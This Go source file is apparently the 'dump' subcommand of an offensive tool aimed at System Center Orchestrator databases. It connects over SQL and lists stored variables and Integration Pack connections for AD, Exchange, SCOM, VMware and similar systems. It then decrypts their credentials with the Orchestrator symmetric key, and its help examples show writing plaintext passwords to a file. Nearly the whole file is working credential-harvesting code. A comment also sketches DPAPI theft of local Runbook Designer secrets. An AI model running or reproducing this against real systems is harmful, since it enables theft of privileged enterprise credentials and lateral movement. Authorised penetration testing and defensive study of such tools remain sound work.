package main

import (
	"context"
	"database/sql"
	"encoding/xml"
	"fmt"
	"io"
	"strings"

	_ "github.com/microsoft/go-mssqldb"
)

// connectionConfig represents common fields in SCORCH IP connection XML
type connectionConfig struct {
	XMLName  xml.Name `xml:"Configuration"`
	Server   string   `xml:"Server"`
	Port     string   `xml:"Port"`
	Domain   string   `xml:"Domain"`
	Username string   `xml:"UserName"`
	Password string   `xml:"Password"`
	// Alternative field names used by some IPs
	ComputerName string `xml:"ComputerName"`
	User         string `xml:"User"`
}

type Variable struct {
	Name           string `json:"name"`
	Path           string `json:"path"`
	EncryptedValue string `json:"encrypted_value,omitempty"`
	DecryptedValue string `json:"decrypted_value,omitempty"`
	IsEncrypted    bool   `json:"is_encrypted"`
}

type Connection struct {
	Name     string `json:"name"`
	Type     string `json:"type"`
	IPType   string `json:"ip_type,omitempty"`
	Server   string `json:"server,omitempty"`
	Username string `json:"username,omitempty"`
	Password string `json:"password,omitempty"`
}

type IPSummary struct {
	Type  string `json:"type"`
	Count int    `json:"count"`
}

type DatabaseInfo struct {
	Server             string `json:"server"`
	Database           string `json:"database"`
	Version            string `json:"version"`
	EncryptionEnabled  bool   `json:"encryption_enabled"`
	TotalVariables     int    `json:"total_variables"`
	EncryptedVariables int    `json:"encrypted_variables"`
	TotalRunbooks      int    `json:"total_runbooks"`
	TotalConnections   int    `json:"total_connections"`
}

type DumpResult struct {
	Info        *DatabaseInfo `json:"info,omitempty"`
	IPSummary   []IPSummary   `json:"ip_summary,omitempty"`
	Variables   []Variable    `json:"variables,omitempty"`
	Connections []Connection  `json:"connections,omitempty"`
}

func runDump(args []string) error {
	if containsHelp(args) {
		printDumpHelp()
		return nil
	}

	opts, remaining, err := parseCommonFlags(args)
	if err != nil {
		return err
	}

	// Default to SQL port
	if opts.Port == 81 {
		opts.Port = 1433
	}

	// Parse dump-specific flags
	database, remaining := parseFlag(remaining, "-db", "-database", "--database")
	if database == "" {
		database = "Orchestrator"
	}

	infoOnly, remaining := parseBoolFlag(remaining, "-info", "--info")
	all, remaining := parseBoolFlag(remaining, "-all", "--all")
	decrypt, remaining := parseBoolFlag(remaining, "-decrypt", "--decrypt")
	sensitive, remaining := parseBoolFlag(remaining, "-sensitive", "--sensitive")
	ipSummary, remaining := parseBoolFlag(remaining, "-ip-summary", "--ip-summary")
	ipFilter, _ := parseFlag(remaining, "-ip", "--ip")

	if err := opts.Validate(); err != nil {
		return err
	}

	ctx, cancel := createContext(opts)
	defer cancel()

	printf(opts, "[*] Connecting to %s:%d/%s\n", opts.Target, opts.Port, database)

	// Build connection string
	connStr := buildSQLConnString(opts, database)
	debugf(opts, "Connection string: %s", maskConnString(connStr))

	db, err := sql.Open("sqlserver", connStr)
	if err != nil {
		return fmt.Errorf("failed to open connection: %w", err)
	}
	defer db.Close()

	if err := db.PingContext(ctx); err != nil {
		return fmt.Errorf("failed to connect: %w", err)
	}

	printf(opts, "[+] Connected\n")

	output, cleanup, err := getOutput(opts)
	if err != nil {
		return err
	}
	defer cleanup()

	result := &DumpResult{}

	// Get database info
	info, errs := getDatabaseInfo(ctx, db)
	for _, err := range errs {
		debugf(opts, "DB info: %v", err)
	}
	result.Info = info

	if infoOnly {
		if opts.JSON {
			return writeJSON(output, result)
		}
		printDatabaseInfo(output, info)
		return nil
	}

	// IP Summary mode
	if ipSummary {
		printf(opts, "[*] Getting Integration Pack summary...\n")
		summary, err := getIPSummary(ctx, db)
		if err != nil {
			debugf(opts, "Error getting IP summary: %v", err)
		} else {
			result.IPSummary = summary
			printf(opts, "[+] Found %d Integration Pack types\n", len(summary))
		}
		if opts.JSON {
			return writeJSON(output, result)
		}
		printIPSummary(output, result.IPSummary)
		return nil
	}

	if all || ipFilter != "" {
		// Extract variables (unless filtering by IP type)
		if ipFilter == "" {
			printf(opts, "[*] Extracting variables...\n")
			vars, err := extractVariables(ctx, db, decrypt)
			if err != nil {
				debugf(opts, "Error extracting variables: %v", err)
			} else {
				result.Variables = vars
				printf(opts, "[+] Found %d variables\n", len(vars))
			}
		}

		// Extract connections
		printf(opts, "[*] Extracting connections...\n")
		conns, err := extractConnections(ctx, db, decrypt)
		if err != nil {
			debugf(opts, "Error extracting connections: %v", err)
		} else {
			// Filter by IP type if specified
			if ipFilter != "" {
				conns = filterConnectionsByIP(conns, ipFilter)
				printf(opts, "[+] Found %d connections matching '%s'\n", len(conns), ipFilter)
			} else {
				printf(opts, "[+] Found %d connections\n", len(conns))
			}
			result.Connections = conns
		}
	}

	if opts.JSON {
		if !sensitive {
			maskDumpResult(result)
		}
		return writeJSON(output, result)
	}

	printDumpResult(output, result, sensitive)
	return nil
}

func buildSQLConnString(opts *CommonOpts, database string) string {
	var params []string

	params = append(params, fmt.Sprintf("server=%s", opts.Target))
	params = append(params, fmt.Sprintf("port=%d", opts.Port))
	params = append(params, fmt.Sprintf("database=%s", database))

	if opts.Username != "" && opts.Password != "" {
		// SQL Server authentication
		params = append(params, fmt.Sprintf("user id=%s", opts.Username))
		params = append(params, fmt.Sprintf("password=%s", opts.Password))
	} else {
		// Windows/Trusted authentication
		params = append(params, "trusted_connection=yes")
	}

	if opts.SkipVerify {
		params = append(params, "TrustServerCertificate=true")
	}

	return strings.Join(params, ";")
}

func maskConnString(s string) string {
	// Mask password in connection string
	if idx := strings.Index(s, "password="); idx != -1 {
		end := strings.Index(s[idx:], ";")
		if end == -1 {
			return s[:idx+9] + "****"
		}
		return s[:idx+9] + "****" + s[idx+end:]
	}
	return s
}

func getDatabaseInfo(ctx context.Context, db *sql.DB) (*DatabaseInfo, []error) {
	info := &DatabaseInfo{}
	var errs []error

	// Get server name and version
	row := db.QueryRowContext(ctx, "SELECT @@SERVERNAME, @@VERSION")
	var version string
	if err := row.Scan(&info.Server, &version); err != nil {
		errs = append(errs, fmt.Errorf("server info: %w", err))
	}
	if len(version) > 100 {
		version = version[:100]
	}
	info.Version = version

	// Get database name
	if err := db.QueryRowContext(ctx, "SELECT DB_NAME()").Scan(&info.Database); err != nil {
		errs = append(errs, fmt.Errorf("database name: %w", err))
	}

	// Check if encryption keys exist
	var keyCount int
	if err := db.QueryRowContext(ctx, `
		SELECT COUNT(*) FROM sys.symmetric_keys 
		WHERE name = 'ORCHESTRATOR_SYM_KEY'
	`).Scan(&keyCount); err != nil {
		errs = append(errs, fmt.Errorf("encryption key check: %w", err))
	}
	info.EncryptionEnabled = keyCount > 0

	// Count variables
	if err := db.QueryRowContext(ctx, `
		SELECT COUNT(*) FROM dbo.VARIABLES v 
		INNER JOIN dbo.OBJECTS o ON o.UniqueID = v.UniqueID 
		WHERE o.Deleted = 0
	`).Scan(&info.TotalVariables); err != nil {
		errs = append(errs, fmt.Errorf("variable count: %w", err))
	}

	// Count encrypted variables
	if err := db.QueryRowContext(ctx, `
		SELECT COUNT(*) FROM dbo.VARIABLES v 
		INNER JOIN dbo.OBJECTS o ON o.UniqueID = v.UniqueID 
		WHERE o.Deleted = 0 AND v.Value LIKE '%~De/%'
	`).Scan(&info.EncryptedVariables); err != nil {
		errs = append(errs, fmt.Errorf("encrypted variable count: %w", err))
	}

	// Count runbooks
	if err := db.QueryRowContext(ctx, `
		SELECT COUNT(*) FROM dbo.POLICIES WHERE Deleted = 0
	`).Scan(&info.TotalRunbooks); err != nil {
		errs = append(errs, fmt.Errorf("runbook count: %w", err))
	}

	// Count connections
	if err := db.QueryRowContext(ctx, `
		SELECT COUNT(*) FROM dbo.CONNECTIONS WHERE Deleted = 0
	`).Scan(&info.TotalConnections); err != nil {
		errs = append(errs, fmt.Errorf("connection count: %w", err))
	}

	return info, errs
}

func extractVariables(ctx context.Context, db *sql.DB, decrypt bool) ([]Variable, error) {
	query := `
		WITH FolderPath AS (
			SELECT 
				'Variables\' + CAST(name AS VARCHAR(MAX)) AS [path],
				uniqueid
			FROM dbo.folders
			WHERE ParentID = '00000000-0000-0000-0000-000000000005' 
			  AND disabled = 0 AND deleted = 0
			UNION ALL
			SELECT 
				CAST(c.[path] + '\' + CAST(b.name AS VARCHAR(MAX)) AS VARCHAR(MAX)),
				b.uniqueid
			FROM dbo.FOLDERS b
			INNER JOIN FolderPath c ON b.ParentID = c.UniqueID
			WHERE b.Disabled = 0 AND b.Deleted = 0
		)
		SELECT 
			ISNULL(fp.[path], 'Variables') as [Path],
			o.Name,
			v.Value
		FROM dbo.VARIABLES v
		INNER JOIN dbo.OBJECTS o ON o.UniqueID = v.UniqueID
		LEFT JOIN FolderPath fp ON o.ParentID = fp.UniqueID
		WHERE o.Deleted = 0
		ORDER BY [Path], o.Name
	`

	rows, err := db.QueryContext(ctx, query)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var variables []Variable
	for rows.Next() {
		var v Variable
		var rawValue string
		if err := rows.Scan(&v.Path, &v.Name, &rawValue); err != nil {
			continue
		}

		v.IsEncrypted = strings.Contains(rawValue, "~De/")
		if v.IsEncrypted {
			v.EncryptedValue = rawValue
		} else {
			v.DecryptedValue = rawValue
		}

		variables = append(variables, v)
	}

	// Attempt decryption if requested
	if decrypt {
		variables = decryptVariables(ctx, db, variables)
	}

	return variables, nil
}

func decryptVariables(ctx context.Context, db *sql.DB, variables []Variable) []Variable {
	// Open symmetric key
	_, err := db.ExecContext(ctx, `
		OPEN SYMMETRIC KEY ORCHESTRATOR_SYM_KEY 
		DECRYPTION BY ASYMMETRIC KEY ORCHESTRATOR_ASYM_KEY
	`)
	if err != nil {
		return variables // Can't decrypt, return as-is
	}
	defer db.ExecContext(ctx, "CLOSE SYMMETRIC KEY ORCHESTRATOR_SYM_KEY")

	// Decrypt each encrypted variable
	for i, v := range variables {
		if !v.IsEncrypted {
			continue
		}

		// Extract hex data from encrypted format
		// Format: `d.T.~De/[hex_data]`d.T.~De/
		hexData := extractHexFromEncrypted(v.EncryptedValue)
		if hexData == "" {
			continue
		}

		var decrypted sql.NullString
		err := db.QueryRowContext(ctx, `
			SELECT CONVERT(NVARCHAR(MAX), DECRYPTBYKEY(CONVERT(VARBINARY(MAX), @p1, 2)))
		`, hexData).Scan(&decrypted)

		if err == nil && decrypted.Valid {
			variables[i].DecryptedValue = decrypted.String
		}
	}

	return variables
}

func extractHexFromEncrypted(value string) string {
	// Format: `d.T.~De/[hex_data]`d.T.~De/
	start := strings.Index(value, "~De/")
	if start == -1 {
		return ""
	}
	start += 4

	end := strings.Index(value[start:], "`")
	if end == -1 {
		return ""
	}

	return value[start : start+end]
}

// decryptDPAPI attempts to decrypt DPAPI-protected data from local Runbook Designer config.
// This is a placeholder for future implementation of local credential extraction.
//
// DPAPI blobs from Runbook Designer are stored in:
//   - %LOCALAPPDATA%\Microsoft\System Center 2012\Orchestrator\Runbook Designer\*.dat
//   - Registry: HKCU\Software\Microsoft\System Center\2012\Orchestrator\Connections
//
// Implementation would require:
//   - Windows CryptUnprotectData API via syscall or cgo
//   - Running as the user who encrypted the data (or with their master key)
//   - Alternatively, offline decryption with domain backup key (DVCP/BCKUPKEY)
//
// For now, use the SQL Server symmetric key decryption in decryptVariables() for
// credentials stored in the Orchestrator database.
func decryptDPAPI(encryptedData []byte) ([]byte, error) {
	// TODO: Implement Windows DPAPI decryption
	// This would require platform-specific code:
	//
	// On Windows:
	//   var outBlob windows.DataBlob
	//   err := windows.CryptUnprotectData(&inBlob, nil, nil, 0, nil, 0, &outBlob)
	//
	// Cross-platform (offline with master key):
	//   Use dpapick library or implement DPAPI blob parsing
	return nil, fmt.Errorf("DPAPI decryption not implemented - use -decrypt flag for SQL Server decryption")
}

// classifyIPType determines the Integration Pack type based on connection name/type
func classifyIPType(name, connType string) string {
	nameLower := strings.ToLower(name)
	typeLower := strings.ToLower(connType)
	combined := nameLower + " " + typeLower

	switch {
	case strings.Contains(combined, "active directory") || strings.Contains(combined, " ad ") || strings.Contains(typeLower, "activedirectory"):
		return "Active Directory"
	case strings.Contains(combined, "exchange"):
		return "Exchange"
	case strings.Contains(combined, "scom") || strings.Contains(combined, "operations manager") || strings.Contains(typeLower, "operationsmanager"):
		return "SCOM"
	case strings.Contains(combined, "sccm") || strings.Contains(combined, "configmgr") || strings.Contains(combined, "configuration manager") || strings.Contains(typeLower, "configurationmanager"):
		return "SCCM"
	case strings.Contains(combined, "vmware") || strings.Contains(combined, "vsphere") || strings.Contains(combined, "vcenter"):
		return "VMware"
	case strings.Contains(combined, "vmm") || strings.Contains(combined, "virtual machine manager"):
		return "VMM"
	case strings.Contains(combined, "azure"):
		return "Azure"
	case strings.Contains(combined, "sql") || strings.Contains(typeLower, "sqlserver"):
		return "SQL Server"
	case strings.Contains(combined, "ssh") || strings.Contains(typeLower, "ssh"):
		return "SSH"
	case strings.Contains(combined, "rest") || strings.Contains(typeLower, "rest"):
		return "REST"
	default:
		return "Other"
	}
}

// getIPSummary returns a summary of connection counts by Integration Pack type
func getIPSummary(ctx context.Context, db *sql.DB) ([]IPSummary, error) {
	query := `
		SELECT 
			o.Name,
			c.Type
		FROM dbo.CONNECTIONS c
		INNER JOIN dbo.OBJECTS o ON o.UniqueID = c.UniqueID
		WHERE c.Deleted = 0
	`

	rows, err := db.QueryContext(ctx, query)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	counts := make(map[string]int)
	for rows.Next() {
		var name, connType string
		if err := rows.Scan(&name, &connType); err != nil {
			continue
		}
		ipType := classifyIPType(name, connType)
		counts[ipType]++
	}

	var summary []IPSummary
	for t, c := range counts {
		summary = append(summary, IPSummary{Type: t, Count: c})
	}
	return summary, nil
}

// filterConnectionsByIP filters connections by Integration Pack type
func filterConnectionsByIP(conns []Connection, ipType string) []Connection {
	ipTypeLower := strings.ToLower(ipType)
	var filtered []Connection
	for _, c := range conns {
		if strings.ToLower(c.IPType) == ipTypeLower || strings.Contains(strings.ToLower(c.IPType), ipTypeLower) {
			filtered = append(filtered, c)
		}
	}
	return filtered
}

func extractConnections(ctx context.Context, db *sql.DB, decrypt bool) ([]Connection, error) {
	query := `
		SELECT 
			o.Name,
			c.Type,
			c.Configuration
		FROM dbo.CONNECTIONS c
		INNER JOIN dbo.OBJECTS o ON o.UniqueID = c.UniqueID
		WHERE c.Deleted = 0
		ORDER BY o.Name
	`

	rows, err := db.QueryContext(ctx, query)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var connections []Connection
	for rows.Next() {
		var c Connection
		var config string
		if err := rows.Scan(&c.Name, &c.Type, &config); err != nil {
			continue
		}

		// Classify IP type
		c.IPType = classifyIPType(c.Name, c.Type)

		// Parse configuration XML to extract server/username/password
		if config != "" {
			var cfg connectionConfig
			if err := xml.Unmarshal([]byte(config), &cfg); err == nil {
				// Use Server or ComputerName
				c.Server = cfg.Server
				if c.Server == "" {
					c.Server = cfg.ComputerName
				}
				// Use Username or User
				c.Username = cfg.Username
				if c.Username == "" {
					c.Username = cfg.User
				}
				// Password is typically encrypted
				c.Password = cfg.Password
			}
		}

		connections = append(connections, c)
	}

	return connections, nil
}

func maskDumpResult(result *DumpResult) {
	for i := range result.Variables {
		if result.Variables[i].DecryptedValue != "" && result.Variables[i].IsEncrypted {
			result.Variables[i].DecryptedValue = maskPassword(result.Variables[i].DecryptedValue)
		}
	}
	for i := range result.Connections {
		if result.Connections[i].Password != "" {
			result.Connections[i].Password = maskPassword(result.Connections[i].Password)
		}
	}
}

func printIPSummary(w io.Writer, summary []IPSummary) {
	fmt.Fprintln(w, "\n[+] Integration Pack Summary")
	fmt.Fprintln(w, strings.Repeat("-", 40))
	for _, s := range summary {
		fmt.Fprintf(w, "  %-20s %d connections\n", s.Type, s.Count)
	}
	fmt.Fprintln(w)
}

func printDatabaseInfo(w io.Writer, info *DatabaseInfo) {
	fmt.Fprintln(w, "\n[+] SCORCH Database Information")
	fmt.Fprintln(w, strings.Repeat("=", 50))
	fmt.Fprintf(w, "  Server:      %s\n", info.Server)
	fmt.Fprintf(w, "  Database:    %s\n", info.Database)
	fmt.Fprintf(w, "  Encryption:  %v\n", info.EncryptionEnabled)
	fmt.Fprintf(w, "  Variables:   %d (%d encrypted)\n", info.TotalVariables, info.EncryptedVariables)
	fmt.Fprintf(w, "  Runbooks:    %d\n", info.TotalRunbooks)
	fmt.Fprintf(w, "  Connections: %d\n", info.TotalConnections)
}

func printDumpResult(w io.Writer, result *DumpResult, showPasswords bool) {
	if result.Info != nil {
		printDatabaseInfo(w, result.Info)
	}

	if len(result.Variables) > 0 {
		fmt.Fprintf(w, "\n[+] Variables (%d)\n", len(result.Variables))
		fmt.Fprintln(w, strings.Repeat("-", 50))
		for _, v := range result.Variables {
			value := v.DecryptedValue
			if value == "" && v.IsEncrypted {
				value = "[encrypted]"
			} else if value != "" && v.IsEncrypted && !showPasswords {
				value = maskPassword(value)
			}
			fmt.Fprintf(w, "  %s\\%s = %s\n", v.Path, v.Name, truncate(value, 50))
		}
	}

	if len(result.Connections) > 0 {
		fmt.Fprintf(w, "\n[+] Connections (%d)\n", len(result.Connections))
		fmt.Fprintln(w, strings.Repeat("-", 50))
		for _, c := range result.Connections {
			ipLabel := ""
			if c.IPType != "" && c.IPType != "Other" {
				ipLabel = fmt.Sprintf(" [%s]", c.IPType)
			}
			if c.Server != "" {
				fmt.Fprintf(w, "  %s (%s)%s\n    Server: %s\n", c.Name, c.Type, ipLabel, c.Server)
			} else {
				fmt.Fprintf(w, "  %s (%s)%s\n", c.Name, c.Type, ipLabel)
			}
			if c.Username != "" {
				fmt.Fprintf(w, "    User: %s\n", c.Username)
			}
		}
	}

	fmt.Fprintln(w)
}

func printDumpHelp() {
	fmt.Print(`
scorch dump - Extract credentials from SCORCH database

Usage: scorch dump [options]

Target Options:
  -target, -t    SQL Server hostname (required)
  -port, -P      SQL port (default: 1433)

Authentication:
  -u, -username  SQL username (omit for Windows auth)
  -p, -password  SQL password

Options:
  -db            Database name (default: Orchestrator)
  -info          Show database info only
  -all           Extract all credential types
  -decrypt       Attempt to decrypt encrypted values
  -sensitive     Show decrypted passwords (default: masked)

Integration Pack Filtering:
  -ip-summary    Show summary of connections by Integration Pack type
  -ip TYPE       Filter connections by IP type (AD, Exchange, SCOM, SCCM, VMware, etc.)

Output:
  -json          JSON output
  -o, -output    Write to file
  -debug         Debug output

Examples:
  # Show database info (Windows auth from domain-joined Linux)
  scorch dump -t sqlserver.corp.local -info

  # Get summary of Integration Pack connections
  scorch dump -t sqlserver.corp.local -ip-summary

  # Extract only Active Directory connections
  scorch dump -t sqlserver.corp.local -ip AD -decrypt

  # Extract only SCOM connections
  scorch dump -t sqlserver.corp.local -ip SCOM -decrypt -sensitive

  # Extract and decrypt (SQL auth from non-domain box)
  scorch dump -t sqlserver.corp.local -u sa -p 'Pass123' -all -decrypt

  # Full extraction with sensitive passwords
  scorch dump -t sqlserver.corp.local -all -decrypt -sensitive -json -o creds.json

IP Types: AD, Exchange, SCOM, SCCM, VMware, VMM, Azure, SQL, SSH, REST, Other

Notes:
  - Decryption requires membership in Orchestrator Runtime or Admins database role
  - For Windows auth from Linux, ensure Kerberos is configured (kinit)
  - The go-mssqldb driver supports both Windows and SQL authentication

`)
}
